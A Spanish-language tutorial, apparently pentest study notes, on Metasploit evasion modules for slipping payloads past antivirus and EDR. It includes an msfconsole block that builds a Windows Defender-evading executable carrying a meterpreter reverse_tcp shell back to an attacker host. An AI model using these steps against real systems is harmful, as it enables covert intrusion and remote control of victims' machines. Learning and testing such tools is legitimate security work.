# Metasploit - Evasion

Durante una prueba de penetración, uno de los principales obstáculos que enfrenta un atacante es la **detección del payload o shellcode** por parte de herramientas de seguridad como:

- Antivirus (AV)
    
- Sistemas de detección o prevención de intrusos (IDS/IPS)
    
- Software EDR (Endpoint Detection and Response)
    

La mayoría de los payloads generados por defecto en Metasploit pueden ser **detectados por firmas estáticas o heurísticas** de estos sistemas. Esto detiene la explotación antes de que el código malicioso pueda ejecutarse.

---

## ¿Qué son los módulos de evasión?

Los **módulos de evasión (`evasion`)** fueron introducidos en las versiones más recientes de Metasploit para **modificar la estructura y comportamiento del payload**, con el objetivo de evitar que sea detectado por herramientas de defensa.

Estos módulos funcionan aplicando técnicas como:

- **Ofuscación de código** (instrucciones modificadas que hacen lo mismo).
    
- **Cifrado y empaquetado del payload**.
    
- **Carga por partes** (staged delivery).
    
- **Uso de loaders personalizados** que ejecutan el payload en memoria (fileless).
    
- **Evasión del análisis estático**.
    

---

## ¿Cómo se utilizan?

Los módulos de evasión funcionan como cualquier otro módulo de Metasploit:

```bash
msfconsole
use evasion/windows/windows_defender_exe
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

El módulo generará un archivo ejecutable (.exe) que contiene el payload **modificado específicamente para evadir defensas**, como Windows Defender.

---

## Ejemplo de módulo de evasión

- `evasion/windows/windows_defender_exe`: genera un ejecutable ofuscado que evita la detección por Windows Defender.
    
- `evasion/multihandler`: permite manejar sesiones generadas con payloads evadidos.
    

---

## Consideraciones importantes

- La evasión no es garantía de éxito. La efectividad depende del motor AV, la heurística usada, y si el payload ya ha sido analizado anteriormente.
    
- Puede requerirse **combinación con encoders**, técnicas de carga en memoria (como `donut`) o ejecución indirecta (por DLL o macros).
    
- Es recomendable probar los payloads generados en entornos de análisis antes de ejecutarlos contra objetivos reales.


